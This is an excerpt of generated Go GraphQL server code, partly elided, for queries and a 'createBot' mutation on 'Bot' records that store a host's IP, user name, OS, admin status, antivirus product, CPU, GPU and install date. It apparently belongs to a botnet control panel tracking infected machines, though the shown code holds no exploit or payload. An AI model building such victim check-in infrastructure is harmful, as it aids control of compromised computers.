...
func field_Query_bot_args(rawArgs map[string]interface{}) (map[string]interface{}, error) {
	args := map[string]interface{}{}
	var arg0 string
...
func (e *executableSchema) Complexity(typeName, field string, childComplexity int, rawArgs map[string]interface{}) (int, bool) {
	...
	case "Mutation.createBot":
		...
		args, err := field_Mutation_createBot_args(rawArgs)
		if err != nil {
			return 0, false
		}
	...
	case "Query.bot":
		...
		args, err := field_Query_bot_args(rawArgs)
		if err != nil {
			return 0, false
		}
	...
	for i, field := range fields {
		...
		case "bots":
			...
			go func(i int, field graphql.CollectedField) {
				out.Values[i] = ec._Query_bots(ctx, field)
				if out.Values[i] == graphql.Null {
					invalid = true
				}
				wg.Done()
		...
		case "bot":
			wg.Add(1)
			go func(i int, field graphql.CollectedField) {
				out.Values[i] = ec._Query_bot(ctx, field)
				wg.Done()
			}(i, field)
		case "__type":
	...
	for idx1 := range res {
		...
		f := func(idx1 int) {
			...
			arr1[idx1] = func() graphql.Marshaler {
				...
				return ec._Bot(ctx, field.Selections, &res[idx1])
			}()
		}
		if isLen1 {
			f(idx1)
...
func UnmarshalNewBot(v interface{}) (NewBot, error) {
	...
	for k, v := range asMap {
		...
		case "ip":
			var err error
			it.IP, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "whoAmI":
			var err error
			it.WhoAmI, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "os":
			var err error
			it.Os, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "installDate":
			var err error
			it.InstallDate, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "admin":
			var err error
			it.Admin, err = graphql.UnmarshalBoolean(v)
			if err != nil {
				return it, err
			}
		case "av":
			var err error
			it.Av, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "cpu":
			var err error
			it.CPU, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "gpu":
			var err error
			it.Gpu, err = graphql.UnmarshalString(v)
			if err != nil {
				return it, err
			}
		case "version":
